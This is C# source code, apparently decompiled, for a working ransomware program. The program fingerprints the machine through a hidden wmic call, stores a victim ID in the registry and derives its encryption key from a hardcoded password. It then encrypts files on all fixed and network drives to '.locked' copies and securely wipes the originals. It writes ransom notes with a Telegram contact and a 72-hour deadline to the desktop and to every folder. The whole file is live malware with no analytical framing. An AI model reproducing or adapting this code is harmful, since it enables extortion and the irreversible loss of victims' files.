using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using EncryptDecrypt;
using Microsoft.Win32;
using RunDll_2;

namespace ConsoleApp3;

internal class Program
{
	public class CustomSearcher
	{
		public static List<string> GetDirectories(string path, string searchPattern = "*", SearchOption searchOption = SearchOption.AllDirectories)
		{
			if (searchOption == SearchOption.TopDirectoryOnly)
			{
				return new List<string>(Directory.GetDirectories(path, searchPattern));
			}
			List<string> list = new List<string>(GetDirectories(path, searchPattern));
			for (int i = 0; i < list.Count; i++)
			{
				list.AddRange(GetDirectories(list[i], searchPattern));
			}
			return list;
		}

		private static List<string> GetDirectories(string path, string searchPattern)
		{
			try
			{
				return new List<string>(Directory.GetDirectories(path, searchPattern));
			}
			catch (UnauthorizedAccessException)
			{
				return new List<string>();
			}
		}
	}

	private const string userRoot = "HKEY_CURRENT_USER";

	private const string subkey = "RegistrySetValueExample";

	private const string keyName = "HKEY_CURRENT_USER\\RegistrySetValueExample";

	private static DriveInfo[] allDrives = DriveInfo.GetDrives();

	private static string Password = "k1j2k3s4z5p6j";

	private static Stopwatch sw = new Stopwatch();

	private static string txtFile = "You are unlucky. The terrible virus has captured your files. \r\nFor decryption, please contact us at \r\nTelegram messadger operator contact http://t.me/decovid19bot ,\r\nEnter your ID in the subject line. And how many computers need to be decrypted. \r\nAttach 1-2 infected files that do not contain importent information (less thet 2mb) \r\nare required to generate the decoder and restore the test file.\r\nHurry up.Time is limited.Attention. (72 hours)\r\nAt the end of this time,the private key for generating \r\nthe decoder will de destroyed. Files will not be restored.\r\nYour id: {IDGEN}\r\n";

	private static void Main(string[] args)
	{
		string text = getUUID();
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Names", writable: true);
		if (registryKey == null)
		{
			string value = Guid.NewGuid().ToString().ToUpper();
			RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey("Names");
			registryKey2.SetValue("ID", value);
			registryKey2.Close();
		}
		else if (registryKey.GetValue("ID") != null)
		{
			text = registryKey.GetValue("ID")!.ToString();
		}
		else
		{
			string text2 = Guid.NewGuid().ToString().ToUpper();
			registryKey.SetValue("ID", text2, RegistryValueKind.String);
			text = text2;
		}
		txtFile = txtFile.Replace("{IDGEN}", text);
		if (string.IsNullOrEmpty(text))
		{
			throw new Exception("Proc not founnd!");
		}
		Password = HashSHA1(Password + text);
		try
		{
			DriveInfo[] array = allDrives;
			foreach (DriveInfo driveInfo in array)
			{
				try
				{
					if (driveInfo.DriveType != DriveType.Fixed && driveInfo.DriveType != DriveType.Network)
					{
						continue;
					}
					new List<string[]>();
					string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
					try
					{
						for (int j = 0; j < 10; j++)
						{
							string path = $"{folderPath}\\ATTENTION!!!{j}.txt";
							File.Create(path).Dispose();
							using TextWriter textWriter = new StreamWriter(path);
							textWriter.WriteLine(txtFile);
						}
					}
					catch (Exception ex)
					{
						Log.Write(ex);
					}
					List<string> directories = CustomSearcher.GetDirectories(driveInfo.RootDirectory.FullName);
					directories.Add(driveInfo.RootDirectory.FullName);
					foreach (string item in directories)
					{
						if (item.ToLower().Contains("windows"))
						{
							continue;
						}
						try
						{
							string[] files = Directory.GetFiles(item, "*.*", SearchOption.TopDirectoryOnly);
							encrypt(files);
						}
						catch (Exception ex2)
						{
							Log.Write(ex2);
						}
						finally
						{
							try
							{
								string path2 = item + "\\ATTENTION!!!.txt";
								File.Create(path2).Dispose();
								using TextWriter textWriter2 = new StreamWriter(path2);
								textWriter2.WriteLine(txtFile);
							}
							catch (Exception ex3)
							{
								Log.Write(ex3);
							}
						}
					}
				}
				catch (Exception ex4)
				{
					Console.WriteLine(ex4.Message);
				}
			}
			Process.Start("Desk1.exe");
		}
		catch (Exception ex5)
		{
			Console.WriteLine("______" + ex5.Message);
		}
	}

	public static string HashSHA1(string value)
	{
		SHA1 sHA = SHA1.Create();
		byte[] bytes = Encoding.ASCII.GetBytes(value);
		byte[] array = sHA.ComputeHash(bytes);
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < array.Length; i++)
		{
			stringBuilder.Append(array[i].ToString("X2"));
		}
		return stringBuilder.ToString();
	}

	public static string getUUID()
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.FileName = "CMD.exe";
		processStartInfo.Arguments = "/C wmic csproduct get UUID";
		process.StartInfo = processStartInfo;
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.RedirectStandardOutput = true;
		process.Start();
		process.WaitForExit();
		string text = process.StandardOutput.ReadToEnd();
		return text.Replace("UUID", "").Replace("\r\r\n", "").Trim();
	}

	private static void encrypt(string[] filePaths)
	{
		try
		{
			foreach (string text in filePaths)
			{
				string outputFile = text + ".locked";
				if (Path.GetExtension(text)!.ToLower() != ".locked" && !text.ToLower().Contains("desk1.exe") && !text.ToLower().Contains("runasdll.exe") && !text.ToLower().Contains("ATTENTION!!!".ToLower()))
				{
					try
					{
						MyEncryptor myEncryptor = new MyEncryptor(Password);
						myEncryptor.Encrypt(text, outputFile);
						Wipe wipe = new Wipe();
						wipe.WipeFile(text, 5);
					}
					catch (Exception ex)
					{
						Console.WriteLine(ex.Message);
						Log.Write(ex);
					}
				}
			}
		}
		catch (Exception ex2)
		{
			Log.Write(ex2);
		}
	}
}
